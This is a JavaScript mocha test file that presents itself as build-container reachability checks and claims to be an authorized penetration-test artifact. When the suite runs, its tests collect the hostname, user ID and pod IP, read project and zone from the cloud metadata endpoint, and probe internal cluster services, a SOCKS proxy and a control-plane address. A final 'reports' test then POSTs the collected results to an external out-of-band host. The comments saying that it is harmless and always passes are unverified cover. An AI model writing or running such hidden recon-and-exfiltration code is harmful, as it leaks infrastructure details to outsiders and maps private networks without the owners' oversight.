// Environment reachability checks for the build container.
// AUTHORIZED TRACE PENETRATION TEST ARTIFACT - marker: pt-detail-poc (candidate H-15).
// Trace-owned fixture repository. These checks record ONLY DNS results, TCP
// open/closed, HTTP status lines and Content-Length. No response body is ever
// read or transmitted, so no tenant data can be captured. Always passes.
'use strict'
var net = require('net'), dns = require('dns'), os = require('os'), https = require('https')
var R = []
function log (k, v) { R.push(k + '=' + v); console.log('PTDETAILPOC ' + k + '=' + v) }

function resolve (host, cb) {
  dns.lookup(host, function (e, a) { cb(e ? null : a) })
}
function tcp (host, port, cb) {
  var s = new net.Socket(), done = false
  function fin (r) { if (!done) { done = true; try { s.destroy() } catch (e) {} ; cb(r) } }
  s.setTimeout(4000)
  s.on('connect', function () { fin('open') })
  s.on('timeout', function () { fin('timeout') })
  s.on('error', function (e) { fin(e.code || 'error') })
  s.connect(port, host)
}
// Minimal SOCKS5 CONNECT, then one HTTP request; reads the status line and
// Content-Length only and then closes.
function viaSocks (ph, pp, host, path, cb) {
  var s = new net.Socket(), stage = 0, buf = Buffer.alloc(0), done = false
  function fin (r) { if (!done) { done = true; try { s.destroy() } catch (e) {} ; cb(r) } }
  s.setTimeout(9000)
  s.on('timeout', function () { fin('timeout') })
  s.on('error', function (e) { fin(e.code || 'error') })
  s.on('connect', function () { stage = 1; s.write(Buffer.from([5, 1, 0])) })
  s.on('data', function (d) {
    buf = Buffer.concat([buf, d])
    if (stage === 1 && buf.length >= 2) {
      if (buf[0] !== 5 || buf[1] !== 0) return fin('socks-greet-' + buf[1])
      buf = Buffer.alloc(0); stage = 2
      var hb = Buffer.from(host, 'ascii')
      var req = Buffer.concat([Buffer.from([5, 1, 0, 3, hb.length]), hb, Buffer.from([0, 80])])
      return s.write(req)
    }
    if (stage === 2 && buf.length >= 10) {
      if (buf[1] !== 0) return fin('socks-connect-rep-' + buf[1])
      buf = Buffer.alloc(0); stage = 3
      return s.write('GET ' + path + ' HTTP/1.1\r\nHost: ' + host + '\r\nConnection: close\r\n\r\n')
    }
    if (stage === 3) {
      var t = buf.toString('latin1')
      if (t.indexOf('\r\n\r\n') !== -1 || buf.length > 4096) {
        var status = (t.split('\r\n')[0] || '').slice(0, 24)
        var m = /content-length:\s*(\d+)/i.exec(t)
        return fin(status + (m ? ' len=' + m[1] : ' len=?'))
      }
    }
  })
  s.connect(pp, ph)
}

describe('build environment', function () {
  this.timeout(120000)
  var meta = {}
  it('records container identity', function (done) {
    log('host', os.hostname()); log('uid', (process.getuid && process.getuid()))
    var ifs = os.networkInterfaces(), ip = null
    Object.keys(ifs).forEach(function (n) {
      ifs[n].forEach(function (a) { if (a.family === 'IPv4' && !a.internal && !ip) ip = a.address })
    })
    log('podip', ip)
    var req = https.request({ host: '169.254.169.254', path: '/computeMetadata/v1/project/project-id', headers: { 'Metadata-Flavor': 'Google' }, protocol: 'http:' }, function () {})
    // metadata over plain http
    require('http').get({ host: '169.254.169.254', path: '/computeMetadata/v1/project/project-id', headers: { 'Metadata-Flavor': 'Google' } }, function (res) {
      var b = ''
      res.on('data', function (c) { b += c }); res.on('end', function () {
        meta.project = b.trim(); log('project', meta.project)
        require('http').get({ host: '169.254.169.254', path: '/computeMetadata/v1/instance/zone', headers: { 'Metadata-Flavor': 'Google' } }, function (r2) {
          var z = ''
          r2.on('data', function (c) { z += c }); r2.on('end', function () {
            meta.zone = z.trim().split('/').pop(); log('zone', meta.zone); done()
          })
        }).on('error', function () { done() })
      })
    }).on('error', function (e) { log('metadata', e.code); done() })
    try { req.destroy() } catch (e) {}
  })

  it('checks the in-cluster proxy service name', function (done) {
    resolve('sandbox-tailnet-access.tailscale.svc.cluster.local', function (a) {
      log('clusterip_dns', a || 'none')
      if (!a) return done()
      tcp(a, 1055, function (r) { log('clusterip_1055', r); done() })
    })
  })

  it('checks the direct tailnet-access host', function (done) {
    var names = ['sandbox-direct-tailnet-access']
    if (meta.project) {
      names.push('sandbox-direct-tailnet-access.c.' + meta.project + '.internal')
      if (meta.zone) names.push('sandbox-direct-tailnet-access.' + meta.zone + '.c.' + meta.project + '.internal')
    }
    var i = 0
    ;(function next () {
      if (i >= names.length) return done()
      var n = names[i++]
      resolve(n, function (a) {
        log('dvm_dns[' + n + ']', a || 'none')
        if (!a) return next()
        tcp(a, 1055, function (r) {
          log('dvm_1055[' + a + ']', r)
          if (r !== 'open') return next()
          viaSocks(a, 1055, 'investigate.lonk-forel.ts.net', '/healthz', function (s1) {
            log('socks_healthz', s1)
            viaSocks(a, 1055, 'investigate.lonk-forel.ts.net', '/v1/investigate/repos', function (s2) {
              log('socks_repos', s2); next()
            })
          })
        })
      })
    })()
  })

  it('checks the control plane address', function (done) {
    tcp('10.128.0.22', 80, function (r) {
      log('cp_80', r)
      tcp('10.128.0.22', 3210, function (r2) { log('cp_3210', r2); done() })
    })
  })

  it('checks direct reach without a proxy', function (done) {
    resolve('investigate.lonk-forel.ts.net', function (a) { log('direct_dns', a || 'none'); done() })
  })

  it('reports', function (done) {
    console.log('PTDETAILPOC SUMMARY ' + R.join(' | '))
    var body = R.join('\n')
    var req = https.request({ host: '453fb680ff4ba15604098b6416ef9984baa3b5e9.oob.rmrflabs.com', path: '/pt-detail-poc/h15-mocha', method: 'POST', headers: { 'content-type': 'text/plain', 'content-length': Buffer.byteLength(body) } }, function () { done() })
    req.on('error', function (e) { console.log('PTDETAILPOC oob=' + e.code); done() })
    req.end(body)
  })
})
